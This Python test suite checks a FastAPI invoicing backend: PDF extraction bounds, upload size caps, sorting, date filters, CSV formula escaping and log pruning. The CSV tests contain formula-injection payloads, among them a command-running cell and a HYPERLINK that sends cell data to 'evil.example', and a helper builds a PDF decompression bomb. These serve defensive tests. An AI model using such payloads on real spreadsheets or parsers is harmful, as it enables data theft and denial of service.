"""
Backend reliability: CPU-heavy document work off the event loop, upload size
caps, invoice sorting over mixed cell types, admin mirror date filters, CSV
formula injection in exports, and sync_log retention.

  * PDF extraction, the invoice regex pass and export rendering run in
    worker threads, and each has an input bound (studio_docs, openrouter,
    insights)
  * uploads are refused with 413 past the configured cap, before they are
    read whole (utils.uploads and the upload routes)
  * sorting the invoice list by a column that mixes numbers and blanks
    no longer raises (utils.sorting, services.invoice)
  * the admin invoice mirrors bind dates, not strings, to raised_date
  * exported CSV cells cannot run as spreadsheet formulas (utils.csv_safe)
  * sync_log rows past the retention window are pruned hourly (db.sync)
"""

import asyncio
import csv
import datetime
import io
import logging
import time
import zlib
from types import SimpleNamespace

import pypdf
import pytest
from fastapi import HTTPException
from starlette.datastructures import Headers, UploadFile

from app.services.invoice import INVOICE_SORT_FIELDS


def _pdf(pages: list[str]) -> bytes:
    """A real PDF with one line of text per page."""
    from reportlab.pdfgen import canvas

    buf = io.BytesIO()
    c = canvas.Canvas(buf)
    for text in pages:
        c.drawString(72, 720, text)
        c.showPage()
    c.save()
    return buf.getvalue()


@pytest.fixture
def thread_calls(monkeypatch):
    """Record every function handed to asyncio.to_thread, still running it."""
    calls = []
    real = asyncio.to_thread

    async def recording(func, /, *args, **kwargs):
        calls.append(func)
        return await real(func, *args, **kwargs)

    monkeypatch.setattr(asyncio, "to_thread", recording)
    return calls


def _bomb_pdf(inflated_mb: int) -> bytes:
    """A one-page PDF whose content stream inflates to `inflated_mb` MB of spaces."""
    squeeze = zlib.compressobj(9)
    stream = b"".join(squeeze.compress(b" " * (1024 * 1024)) for _ in range(inflated_mb)) + squeeze.flush()
    objs = [
        b"<< /Type /Catalog /Pages 2 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        # A font, or pypdf 6 skips a page that can hold no text without decoding it.
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R"
        b" /Resources << /Font << /F1 << /Type /Font /Subtype /Type1 /BaseFont /Helvetica >> >> >> >>",
        b"<< /Length %d /Filter /FlateDecode >>\nstream\n" % len(stream) + stream + b"\nendstream",
    ]
    out = io.BytesIO()
    out.write(b"%PDF-1.4\n")
    offsets = []
    for number, body in enumerate(objs, start=1):
        offsets.append(out.tell())
        out.write(b"%d 0 obj\n" % number + body + b"\nendobj\n")
    xref = out.tell()
    out.write(b"xref\n0 %d\n0000000000 65535 f \n" % (len(objs) + 1))
    for offset in offsets:
        out.write(b"%010d 00000 n \n" % offset)
    out.write(b"trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n" % (len(objs) + 1, xref))
    return out.getvalue()


_PYPDF_CAPS_INFLATION = int(pypdf.__version__.split(".")[0]) >= 6


def _request(**state):
    return SimpleNamespace(state=SimpleNamespace(**state), headers={}, client=None)


# ── 1. PDF parsing, the invoice regexes and exports run off the loop ─────────

class TestStudioExtraction:
    def test_ingest_extracts_in_a_worker_thread(self, monkeypatch, thread_calls):
        from app.services import studio_docs as D

        failures = []

        class Pool:
            async def fetchrow(self, sql, *a):
                return {"id": "d1", "filename": "a.pdf", "storage_path": "p", "mime_type": "application/pdf"}

            async def execute(self, sql, *a):
                failures.append(a)

        async def read_bytes(path):
            return _pdf(["   "])  # no text: ingest stops after extraction

        monkeypatch.setattr(D, "get_pool", lambda: Pool())
        monkeypatch.setattr(D.storage, "read_bytes", read_bytes)
        asyncio.run(D.ingest_document("d1"))

        assert D.extract_pages in thread_calls
        assert failures and "No text could be extracted" in failures[0][1]

    def test_pdf_extraction_stops_at_the_page_bound(self, monkeypatch):
        from app.services import studio_docs as D

        monkeypatch.setattr(D, "MAX_PDF_PAGES", 3)
        pages = D.extract_pages(_pdf([f"page {i}" for i in range(6)]), "pdf")
        assert pages == ["page 0", "page 1", "page 2"]

    def test_pages_past_the_text_budget_are_counted_but_not_read(self, monkeypatch):
        from app.services import studio_docs as D

        monkeypatch.setattr(D, "MAX_EXTRACT_CHARS", 10)
        pages = D.extract_pages(_pdf(["abcdefgh", "ijklmnop", "qrstuvwx", "yz"]), "pdf")
        assert pages == ["abcdefgh", "ij", "", ""]

    def test_pages_past_the_time_budget_are_counted_but_not_read(self, monkeypatch):
        """A page of drawing operators costs CPU and yields no text: the clock stops it."""
        from app.services import studio_docs as D

        pdf = _pdf(["page 0", "page 1", "page 2"])
        clock = iter(range(0, 10_000, 40))  # each reading is 40 s after the last
        monkeypatch.setattr(D.time, "monotonic", lambda: next(clock))
        monkeypatch.setattr(D, "MAX_EXTRACT_SECONDS", 60)
        assert D.extract_pages(pdf, "pdf") == ["page 0", "", ""]

    @pytest.mark.skipif(not _PYPDF_CAPS_INFLATION, reason="pypdf 6.x, as pinned in requirements.txt, caps inflation")
    def test_a_decompression_bomb_is_refused_not_inflated(self):
        from app.services import studio_docs as D

        bomb = _bomb_pdf(100)  # about 100 KB that inflates to 100 MB
        started = time.perf_counter()
        with pytest.raises(Exception, match="(?i)limit"):
            D.extract_pages(bomb, "pdf")
        assert time.perf_counter() - started < 2  # 4.3.1 inflated and parsed it: ~4.5 s

    def test_text_documents_are_cut_at_the_budget(self, monkeypatch):
        from app.services import studio_docs as D

        monkeypatch.setattr(D, "MAX_EXTRACT_CHARS", 5)
        assert D.extract_pages(b"hello world", "text") == ["hello"]

    def test_the_budget_never_drops_text_a_kept_chunk_would_hold(self):
        """Text past the budget cannot reach the first MAX_CHUNKS_PER_DOC chunks."""
        from app.services import studio_docs as D

        page = "x" * (D.MAX_EXTRACT_CHARS + 50_000)
        chunks = D.chunk_pages([page])
        assert len(chunks) == D.MAX_CHUNKS_PER_DOC
        assert D.chunk_pages([page[:D.MAX_EXTRACT_CHARS]]) == chunks


class TestInvoiceParse:
    def test_pdf_text_and_regex_pass_run_in_threads(self, monkeypatch, thread_calls):
        from app.services import openrouter as O

        async def fake_chat(messages, **kw):
            return {"content": '{"invoice_number": "WM/26-27/049"}'}

        monkeypatch.setattr(O.settings, "openrouter_api_key", "test-key")
        monkeypatch.setattr(O, "_try_chat", fake_chat)
        out = asyncio.run(O.parse_invoice_document(_pdf(["Sub Total 1,000.00"]), "inv.pdf", "application/pdf"))

        assert O._extract_pdf_text in thread_calls
        assert O._regex_extract_invoice in thread_calls
        assert out["invoice_number"] == "WM/26-27/049"

    def test_extracted_text_is_capped(self, monkeypatch):
        from app.services import openrouter as O

        monkeypatch.setattr(O, "_MAX_INVOICE_TEXT_CHARS", 30)
        text = O._extract_pdf_text(_pdf(["a" * 25, "b" * 25, "c" * 25]))
        assert len(text) == 30
        assert "c" not in text  # stopped before the third page

    def test_pages_past_the_time_budget_are_not_read(self, monkeypatch):
        from app.services import openrouter as O

        pdf = _pdf(["first page", "second page", "third page"])
        clock = iter(range(0, 10_000, 10))  # each reading is 10 s after the last
        monkeypatch.setattr(O.time, "monotonic", lambda: next(clock))
        monkeypatch.setattr(O, "_MAX_INVOICE_EXTRACT_SECONDS", 15)
        assert O._extract_pdf_text(pdf) == "first page"

    @pytest.mark.skipif(not _PYPDF_CAPS_INFLATION, reason="pypdf 6.x, as pinned in requirements.txt, caps inflation")
    def test_a_decompression_bomb_yields_no_text_quickly(self):
        from app.services.openrouter import _extract_pdf_text

        bomb = _bomb_pdf(100)
        started = time.perf_counter()
        assert _extract_pdf_text(bomb) == ""
        assert time.perf_counter() - started < 2  # 4.3.1: ~4.5 s

    def test_a_long_digit_run_is_not_quadratic(self):
        """16k digits took about 4 s before the (?<!\\d) anchor; 50k would take ~40 s."""
        from app.services.openrouter import _regex_extract_invoice

        started = time.perf_counter()
        _regex_extract_invoice("1" * 50_000)
        assert time.perf_counter() - started < 2

    def test_regex_fields_are_unchanged_on_an_invoice(self):
        from app.services.openrouter import _regex_extract_invoice

        text = (
            "TAX INVOICE\n# WM/26-27/049\nInvoice Date : 30/04/2026\nDue Date : 15/05/2026\n"
            "Bill To\nAcme Industries Pvt Ltd\nGSTIN 27ABCDE1234F1Z5\n"
            "1 Website Development\nPhase two build and QA\n998314 1,60,000.00\n"
            "Sub Total 1,60,000.00\nTotal 1,88,800.00\n"
        )
        out = _regex_extract_invoice(text)
        assert out["invoice_number"] == "WM/26-27/049"
        assert out["raised_date"] == "2026-04-30"
        assert out["amount_raised"] == 160000.0
        assert out["amount_with_tax"] == 188800.0
        assert out["project"] == "Acme Industries Pvt Ltd"
        assert out["description"] == "Website Development – Phase two build and QA"


class TestExportBounds:
    class _Pool:
        def __init__(self):
            self.inserts = []

        async def execute(self, sql, *a):
            self.inserts.append(a)

    def _body(self, fmt, rows, columns=("A",)):
        from app.routers.insights import ExportBody
        return ExportBody(page_key="p", source_key="s", title="T", export_format=fmt,
                          columns=list(columns), rows=rows)

    def _run(self, monkeypatch, body):
        from app.routers import insights as I
        pool = self._Pool()
        monkeypatch.setattr(I, "get_pool", lambda: pool)
        try:
            return asyncio.run(I.export_insight(body, _request(), "editor")), pool
        except HTTPException as exc:
            return exc, pool

    def test_pdf_past_its_row_cap_is_413_before_anything_is_written(self, monkeypatch):
        from app.routers import insights as I
        monkeypatch.setattr(I, "MAX_PDF_EXPORT_ROWS", 3)
        exc, pool = self._run(monkeypatch, self._body("pdf", [["x"]] * 4))
        assert isinstance(exc, HTTPException) and exc.status_code == 413
        assert "Excel" in exc.detail
        assert pool.inserts == []

    def test_any_format_past_the_row_cap_is_413(self, monkeypatch):
        from app.routers import insights as I
        monkeypatch.setattr(I, "MAX_EXPORT_ROWS", 3)
        exc, pool = self._run(monkeypatch, self._body("excel", [["x"]] * 4))
        assert isinstance(exc, HTTPException) and exc.status_code == 413
        assert pool.inserts == []

    def test_too_many_columns_is_413(self, monkeypatch):
        from app.routers import insights as I
        monkeypatch.setattr(I, "MAX_EXPORT_COLUMNS", 2)
        exc, _ = self._run(monkeypatch, self._body("excel", [], columns=("A", "B", "C")))
        assert isinstance(exc, HTTPException) and exc.status_code == 413

    @pytest.mark.parametrize("fmt,builder", [("excel", "build_excel_xml"), ("pdf", "build_simple_pdf")])
    def test_rendering_runs_in_a_worker_thread(self, monkeypatch, thread_calls, fmt, builder):
        from app.routers import insights as I
        res, pool = self._run(monkeypatch, self._body(fmt, [["1"], ["2"]]))
        assert res.status_code == 200 and res.body
        assert getattr(I, builder) in thread_calls
        assert len(pool.inserts) == 1


# ── 2. upload size caps ──────────────────────────────────────────────────────

def _upload(data: bytes, *, known_size=True, name="f.pdf", content_type="application/pdf"):
    return UploadFile(
        file=io.BytesIO(data),
        size=len(data) if known_size else None,
        filename=name,
        headers=Headers({"content-type": content_type}),
    )


class TestReadUpload:
    def test_the_route_limit_never_exceeds_the_setting(self, monkeypatch):
        from app.utils import uploads as U
        monkeypatch.setattr(U.settings, "max_upload_bytes", 15)
        assert U.upload_limit() == 15
        assert U.upload_limit(10) == 10
        assert U.upload_limit(25) == 15

    def test_default_cap_is_25_mb(self):
        from app.config import Settings
        assert Settings().max_upload_bytes == 25 * 1024 * 1024

    def test_a_file_under_the_limit_is_returned_whole(self):
        from app.utils.uploads import read_upload
        assert asyncio.run(read_upload(_upload(b"abc"), 3)) == b"abc"

    def test_a_known_size_over_the_limit_is_refused_without_reading(self):
        from app.utils.uploads import read_upload

        f = _upload(b"x" * 10)
        with pytest.raises(HTTPException) as e:
            asyncio.run(read_upload(f, 5))
        assert e.value.status_code == 413
        assert f.file.tell() == 0

    def test_an_unknown_size_is_capped_while_reading(self, monkeypatch):
        from app.utils import uploads as U

        monkeypatch.setattr(U, "_READ_CHUNK", 4)
        f = _upload(b"x" * 100, known_size=False)
        with pytest.raises(HTTPException) as e:
            asyncio.run(U.read_upload(f, 10))
        assert e.value.status_code == 413
        assert f.file.tell() == 12  # stopped at the first chunk past the limit


class TestUploadRoutes:
    """Each upload route refuses an oversized file with 413 and stores nothing."""

    @pytest.fixture(autouse=True)
    def small_cap(self, monkeypatch):
        from app.utils import uploads as U
        monkeypatch.setattr(U.settings, "max_upload_bytes", 8)

    def _status(self, coro):
        try:
            asyncio.run(coro)
        except HTTPException as exc:
            return exc.status_code
        return 200

    def test_invoice_attachment(self, monkeypatch):
        from app.routers import invoices as R
        stored = []
        async def upload(self, **kw): stored.append(kw)
        monkeypatch.setattr(R.InvoiceService, "upload_attachment_to_field", upload)
        assert self._status(R.upload_attachment("rec1", "Reference", _request(), _upload(b"x" * 9), "editor")) == 413
        assert stored == []
        assert self._status(R.upload_attachment("rec1", "Reference", _request(), _upload(b"x" * 8), "editor")) == 200
        assert stored[0]["content"] == b"x" * 8

    def test_web_invoice_attachment(self, monkeypatch):
        from app.routers import web_invoices as R
        stored = []
        async def allow(request, key): return None
        async def upload(self, **kw): stored.append(kw)
        monkeypatch.setattr(R, "_require_web_permission", allow)
        monkeypatch.setattr(R.WebInvoiceService, "upload_attachment_to_field", upload)
        assert self._status(R.upload_attachment("rec1", "Reference", _request(), _upload(b"x" * 9), "web")) == 413
        assert stored == []

    def test_web_attachments_only_reach_attachment_columns(self, monkeypatch):
        from app.services import web_invoice as W
        posted = []
        monkeypatch.setattr(W, "shared_client", lambda **k: posted.append(k))
        with pytest.raises(ValueError):
            asyncio.run(W.WebInvoiceService().upload_attachment_to_field(
                record_id="rec1", field_name="Amount Raised", filename="a.pdf",
                content=b"x", content_type="application/pdf"))
        assert posted == []

    def test_invoice_parse_keeps_its_own_smaller_limit(self, monkeypatch):
        from app.routers import invoices as R
        from app.utils import uploads as U
        monkeypatch.setattr(U.settings, "max_upload_bytes", 50 * 1024 * 1024)
        parsed = []
        async def parse(content, fname, mime): parsed.append(content); return {}
        monkeypatch.setattr(R, "parse_invoice_document", parse)
        too_big = _upload(b"x" * (10 * 1024 * 1024 + 1))
        with pytest.raises(HTTPException) as e:
            asyncio.run(R.parse_invoice(_request(), too_big, "editor", "ok", None))
        assert e.value.status_code == 413 and e.value.detail == "File too large (max 10 MB)"
        assert parsed == []

    def test_page_upload(self, monkeypatch):
        from app.routers import pages as R
        from app.services import storage
        stored = []
        async def upload_bytes(data, path, content_type=None): stored.append(data)
        monkeypatch.setattr(storage, "upload_bytes", upload_bytes)
        assert self._status(R.upload_page_asset(_request(), _upload(b"x" * 9, content_type="image/png"), "editor")) == 413
        assert stored == []

    def test_studio_document(self, monkeypatch):
        from app.routers import studio as R
        stored = []
        async def upload_bytes(data, path, content_type=None): stored.append(data)
        monkeypatch.setattr(R, "get_pool", lambda: object())
        monkeypatch.setattr(R, "_require_email_auth", lambda request: None)
        monkeypatch.setattr(R.storage, "upload_bytes", upload_bytes)
        assert self._status(R.upload_document(_request(), _upload(b"x" * 9), "editor", "ok")) == 413
        assert stored == []

    def test_status_attachment_is_413_not_500(self, monkeypatch):
        from app.routers import status as R
        async def no_limit(request): return None
        monkeypatch.setattr(R, "_check_write_rate", no_limit)
        assert self._status(R.upload_status_attachment("rec1", "Files", _request(), _upload(b"x" * 9), "editor", "ok")) == 413


class TestUploadMiddleware:
    def test_an_oversized_multipart_body_is_refused_before_any_route_runs(self, monkeypatch):
        monkeypatch.setenv("APP_SECRET", "x-local-test-secret-xxxxxxxxxxxx")
        from fastapi.testclient import TestClient
        import app.main as M
        from app.utils import uploads as U

        monkeypatch.setattr(U.settings, "max_upload_bytes", 1024)
        client = TestClient(M.app)
        big = b"x" * (U.MULTIPART_OVERHEAD_BYTES + 4096)
        res = client.post("/api/pages/upload", files={"file": ("a.png", big, "image/png")})
        assert res.status_code == 413
        # Refused before the route's auth check, which would have said 401.
        assert res.json()["error"]["message"].startswith("File too large")

    def test_an_oversized_body_with_no_length_is_413_through_the_full_app(self, monkeypatch):
        """Streamed with no Content-Length, the cap trips inside form parsing."""
        monkeypatch.setenv("APP_SECRET", "x-local-test-secret-xxxxxxxxxxxx")
        from fastapi.testclient import TestClient
        import app.main as M
        from app.utils import uploads as U

        monkeypatch.setattr(U.settings, "max_upload_bytes", 1024)

        def body():
            yield b'--b\r\nContent-Disposition: form-data; name="file"; filename="a.png"\r\n'
            yield b"Content-Type: image/png\r\n\r\n"
            for _ in range(40):
                yield b"x" * 4096
            yield b"\r\n--b--\r\n"

        res = TestClient(M.app).post("/api/pages/upload", content=body(),
                                     headers={"content-type": "multipart/form-data; boundary=b"})
        assert res.status_code == 413
        assert res.json()["error"]["message"].startswith("File too large")

    def test_a_small_multipart_body_passes_through(self, monkeypatch):
        monkeypatch.setenv("APP_SECRET", "x-local-test-secret-xxxxxxxxxxxx")
        from fastapi.testclient import TestClient
        import app.main as M

        res = TestClient(M.app).post("/api/pages/upload", files={"file": ("a.png", b"png", "image/png")})
        assert res.status_code == 401  # reached the route's auth check

    def test_a_body_with_no_length_is_counted_as_it_streams(self, monkeypatch):
        from app.utils import uploads as U

        monkeypatch.setattr(U.settings, "max_upload_bytes", 10)
        limit = 10 + U.MULTIPART_OVERHEAD_BYTES
        chunk = b"x" * (limit // 2 + 1)
        messages = [
            {"type": "http.request", "body": chunk, "more_body": True},
            {"type": "http.request", "body": chunk, "more_body": True},
            {"type": "http.request", "body": chunk, "more_body": False},
        ]
        consumed = []

        async def receive():
            consumed.append(1)
            return messages[len(consumed) - 1]

        seen = []

        async def app(scope, receive, send):
            while True:
                message = await receive()
                seen.append(len(message["body"]))
                if not message.get("more_body"):
                    break

        scope = {"type": "http", "method": "POST",
                 "headers": [(b"content-type", b"multipart/form-data; boundary=x")]}
        with pytest.raises(HTTPException) as e:
            asyncio.run(U.UploadSizeLimitMiddleware(app)(scope, receive, None))
        assert e.value.status_code == 413
        assert seen == [len(chunk)]      # the app never got the chunk over the limit
        assert len(consumed) == 3        # the rest of the body was drained

    def test_other_requests_are_untouched(self):
        from app.utils import uploads as U

        called = []

        async def app(scope, receive, send):
            called.append(receive)

        async def receive():
            return {}

        scope = {"type": "http", "headers": [(b"content-type", b"application/json"), (b"content-length", b"999999999")]}
        asyncio.run(U.UploadSizeLimitMiddleware(app)(scope, receive, None))
        assert called == [receive]


# ── 3. invoice sorting over mixed cell types ─────────────────────────────────

_MIXED = [
    {"id": "paid",    "fields": {"Payment Status": "Paid", "Raised Date": "2026-01-01T00:00:00.000Z", "Amount Raised": 500.0,
                                 "Amount with Tax": 590.0, "Amount Received": 590.0, "Outstanding Amount": 0,
                                 "Invoice Number": "WM/1", "Project": "Acme", "Agening (Days)": None}},
    {"id": "pending", "fields": {"Payment Status": "Pending", "Raised Date": "2026-02-01T00:00:00.000Z", "Amount Raised": 1000.0,
                                 "Amount with Tax": 1180.0, "Outstanding Amount": 1180.0, "Invoice Number": "WM/2",
                                 "Project": "Beta"}},
    {"id": "draft",   "fields": {"Payment Status": "Pending", "Raised Date": "", "Amount Raised": None,
                                 "Outstanding Amount": "", "Project": ""}},
    {"id": "bare",    "fields": {}},
]


class _TeableResponse:
    def __init__(self, records): self._records = records
    def raise_for_status(self): pass
    def json(self): return {"records": self._records}


class _TeableClient:
    def __init__(self, records): self._records = records
    async def __aenter__(self): return self
    async def __aexit__(self, *a): pass
    async def get(self, url, params=None, headers=None):
        return _TeableResponse([{**r, "fields": dict(r["fields"])} for r in self._records])


class TestInvoiceSort:
    def _list(self, monkeypatch, order_by, order="desc"):
        from app.services import invoice as S
        monkeypatch.setattr(S, "shared_client", lambda **k: _TeableClient(_MIXED))
        out = asyncio.run(S.InvoiceService().list_invoices(order_by=order_by, order=order))
        return [r["id"] for r in out["records"]]

    @pytest.mark.parametrize("order_by", sorted(INVOICE_SORT_FIELDS))
    @pytest.mark.parametrize("order", ["asc", "desc"])
    def test_every_sortable_column_sorts_mixed_data(self, monkeypatch, order_by, order):
        assert sorted(self._list(monkeypatch, order_by, order)) == sorted(r["id"] for r in _MIXED)

    def test_numbers_order_by_value_and_zero_is_not_blank(self, monkeypatch):
        # Outstanding: pending 1180 > paid 0 > blanks (draft "", bare missing)
        assert self._list(monkeypatch, "Outstanding Amount")[:2] == ["pending", "paid"]
        assert self._list(monkeypatch, "Outstanding Amount", "asc")[2:] == ["paid", "pending"]

    def test_received_with_missing_cells(self, monkeypatch):
        assert self._list(monkeypatch, "Amount Received")[0] == "paid"

    def test_an_unknown_column_falls_back_to_raised_date(self, monkeypatch):
        assert self._list(monkeypatch, "Reference") == self._list(monkeypatch, "Raised Date")
        assert self._list(monkeypatch, "no such field")[:2] == ["pending", "paid"]

    def test_web_invoice_teable_fallback_sorts_mixed_data(self, monkeypatch):
        from app.services import web_invoice as W
        monkeypatch.setattr(W, "shared_client", lambda **k: _TeableClient(_MIXED))
        out = asyncio.run(W.WebInvoiceService()._fetch_records(order_by="Amount Received"))
        assert out[0]["id"] == "paid"

    def test_cell_sort_key_orders_any_mix(self):
        from app.utils.sorting import cell_sort_key
        values = ["b", 3, None, 0, "", 1.5, [], "a", {"title": "x"}, -2]
        ordered = sorted(values, key=cell_sort_key)
        assert ordered[:3] == [None, "", []]
        assert ordered[3:7] == [-2, 0, 1.5, 3]
        assert ordered[7:9] == ["a", "b"]


# ── 4. admin mirror date filters ─────────────────────────────────────────────

class _MirrorPool:
    def __init__(self):
        self.params = []

    async def fetchval(self, sql, *params):
        self.params.append(params)
        return 0

    async def fetch(self, sql, *params):
        return []


class TestAdminMirrorDates:
    def _call(self, monkeypatch, handler_name, from_ts, to_ts):
        from app.routers import admin as A
        pool = _MirrorPool()
        monkeypatch.setattr(A, "get_pool", lambda: pool)
        handler = getattr(A, handler_name)
        asyncio.run(handler(limit=100, offset=0, payment_status=None, project=None, invoice_number=None,
                            teable_id=None, from_ts=from_ts, to_ts=to_ts, _="admin"))
        return pool.params[0]

    @pytest.mark.parametrize("handler", ["admin_mirror_invoices", "admin_mirror_web_invoices"])
    def test_dates_are_bound_as_dates(self, monkeypatch, handler):
        params = self._call(monkeypatch, handler, "2026-01-01", "2026-03-31T23:59:59Z")
        assert params == (datetime.date(2026, 1, 1), datetime.date(2026, 3, 31))

    @pytest.mark.parametrize("handler", ["admin_mirror_invoices", "admin_mirror_web_invoices"])
    @pytest.mark.parametrize("bad", ["yesterday", "2026-13-01", "01/02/2026"])
    def test_a_bad_date_is_400(self, monkeypatch, handler, bad):
        with pytest.raises(HTTPException) as e:
            self._call(monkeypatch, handler, bad, None)
        assert e.value.status_code == 400 and "from_ts" in e.value.detail


# ── 5. CSV exports cannot carry formulas ─────────────────────────────────────

def _hostile_invoice():
    return {"id": "r1", "fields": {"Invoice Number": "=cmd|' /C calc'!A0", "Raised Date": "2026-01-01",
                                   "Project": "@evil", "Amount Raised": -500.0,
                                   "Remark": '=HYPERLINK("https://evil.example/?d="&B2,"details")'}}


class TestCsvSafe:
    @pytest.mark.parametrize("value", ["=1+1", "+1", "-1+2", "@SUM(A1)", "\t=1", "\r=1",
                                       '=HYPERLINK("https://evil.example/?d="&B2,"x")'])
    def test_formula_starts_are_quoted(self, value):
        from app.utils.csv_safe import csv_safe_cell
        assert csv_safe_cell(value) == "'" + value

    @pytest.mark.parametrize("value", ["WM/26-27/049", "Acme", "", "a=b", -500.0, 0, None, 12])
    def test_everything_else_is_unchanged(self, value):
        from app.utils.csv_safe import csv_safe_cell
        assert csv_safe_cell(value) == value

    def _rows(self, response):
        async def body():
            return b"".join([c if isinstance(c, bytes) else c.encode() async for c in response.body_iterator])
        return list(csv.reader(io.StringIO(asyncio.run(body()).decode())))

    def test_invoice_export(self, monkeypatch):
        from app.routers import invoices as R

        async def fake_list(self, **kw):
            return {"records": [_hostile_invoice()], "total": 1}
        monkeypatch.setattr(R.InvoiceService, "list_invoices", fake_list)
        rows = self._rows(asyncio.run(R.export_invoices(
            _request(), fmt="csv", status=None, project=None, date_from=None, date_to=None,
            _role="editor", _perm="ok")))
        header, row = rows
        cell = dict(zip(header, row))
        assert cell["Invoice Number"].startswith("'=")
        assert cell["Project"] == "'@evil"
        assert cell["Remark"].startswith("'=HYPERLINK")
        assert cell["Amount Raised"] == "-500.0"

    def test_web_invoice_export(self, monkeypatch):
        from app.routers import web_invoices as R

        async def fake_list(self, **kw):
            return {"records": [_hostile_invoice()], "total": 1}
        monkeypatch.setattr(R.WebInvoiceService, "list_invoices", fake_list)
        rows = self._rows(asyncio.run(R.export_web_invoices(
            _request(), status=None, project=None, date_from=None, date_to=None, _role="web", _perm="ok")))
        cell = dict(zip(*rows))
        assert cell["Remark"].startswith("'=HYPERLINK")
        assert cell["Invoice Number"].startswith("'=")

    def test_admin_user_timeline_export(self, monkeypatch):
        """The email and ip columns come from sign-in attempts, not from staff."""
        from app.routers import admin as A

        class Pool:
            async def fetchrow(self, sql, *a):
                return {"id": "u1", "email": "u@example.com", "first_name": None,
                        "last_name": None, "full_name": None}

            async def fetch(self, sql, *a):
                return [{"created_at": datetime.datetime(2026, 1, 1, tzinfo=datetime.timezone.utc),
                         "event_type": "login_failed", "role": None,
                         "email": '=HYPERLINK("https://evil.example/?d="&A2,"x")', "status": "failed",
                         "ip": "@SUM(1+1)", "actor_email": None, "metadata": '{"reason": "-1"}'}]

        monkeypatch.setattr(A, "get_pool", lambda: Pool())
        res = asyncio.run(A.admin_user_timeline_export("u1", fmt="csv", _="admin"))
        header, row = list(csv.reader(io.StringIO(res.body.decode())))
        cell = dict(zip(header, row))
        assert cell["email"].startswith("'=HYPERLINK")
        assert cell["ip"] == "'@SUM(1+1)"
        assert cell["event_type"] == "login_failed"
        assert cell["metadata"] == '{"reason": "-1"}'


# ── 6. sync_log retention ────────────────────────────────────────────────────

class _PrunePool:
    def __init__(self, counts):
        self.counts = list(counts)
        self.calls = []

    async def execute(self, sql, *params):
        self.calls.append((sql, params))
        return f"DELETE {self.counts.pop(0)}"


class TestSyncLogRetention:
    def test_deletes_in_batches_until_a_short_batch(self, monkeypatch):
        import app.db.sync as S
        monkeypatch.setattr(S, "_SYNC_LOG_PRUNE_BATCH", 10)
        pool = _PrunePool([10, 10, 3])
        assert asyncio.run(S.prune_sync_log(pool, 14)) == 23
        assert len(pool.calls) == 3
        sql, (cutoff, batch) = pool.calls[0]
        assert "DELETE FROM sync_log" in sql and batch == 10
        expected = datetime.datetime.now(datetime.timezone.utc) - datetime.timedelta(days=14)
        assert abs((cutoff - expected).total_seconds()) < 60

    def test_a_backlog_is_cleared_over_several_runs(self, monkeypatch):
        import app.db.sync as S
        monkeypatch.setattr(S, "_SYNC_LOG_PRUNE_BATCH", 10)
        monkeypatch.setattr(S, "_SYNC_LOG_PRUNE_MAX_BATCHES", 2)
        pool = _PrunePool([10, 10, 10])
        assert asyncio.run(S.prune_sync_log(pool, 14)) == 20
        assert len(pool.calls) == 2

    def test_zero_days_turns_pruning_off(self):
        import app.db.sync as S
        pool = _PrunePool([])
        assert asyncio.run(S.prune_sync_log(pool, 0)) == 0
        assert pool.calls == []

    def test_runs_at_most_once_an_hour(self, monkeypatch):
        import app.db.sync as S
        pool = _PrunePool([0, 0])
        monkeypatch.setattr(S, "get_pool", lambda: pool)
        monkeypatch.setattr(S, "_last_sync_log_prune_at", None)
        monkeypatch.setattr(S.settings, "sync_log_retention_days", 14)

        asyncio.run(S._maybe_prune_sync_log())
        asyncio.run(S._maybe_prune_sync_log())   # 30 s later, in the loop
        assert len(pool.calls) == 1
        S._last_sync_log_prune_at = time.monotonic() - S._SYNC_LOG_PRUNE_INTERVAL - 1
        asyncio.run(S._maybe_prune_sync_log())
        assert len(pool.calls) == 2

    def test_a_failing_prune_is_logged_not_raised(self, monkeypatch, caplog):
        import app.db.sync as S

        class Down:
            async def execute(self, *a):
                raise ConnectionError("pg gone")

        monkeypatch.setattr(S, "get_pool", lambda: Down())
        monkeypatch.setattr(S, "_last_sync_log_prune_at", None)
        with caplog.at_level(logging.WARNING, logger="fintrack.db.sync"):
            asyncio.run(S._maybe_prune_sync_log())
        assert "sync_log retention prune failed" in caplog.text

    def test_the_sync_loop_prunes(self, monkeypatch):
        import app.db.sync as S
        pruned = []

        async def ok(incremental=False): return None
        async def prune(): pruned.append(1)
        real_sleep = asyncio.sleep
        async def fast(s): await real_sleep(0)

        monkeypatch.setattr(S, "run_sync", ok)
        monkeypatch.setattr(S, "_maybe_prune_sync_log", prune)
        monkeypatch.setattr(S.asyncio, "sleep", fast)

        async def drive():
            t = asyncio.create_task(S.sync_loop())
            for _ in range(10):
                await real_sleep(0.001)
            t.cancel()
            try: await t
            except (asyncio.CancelledError, Exception): pass
        asyncio.run(drive())
        assert pruned
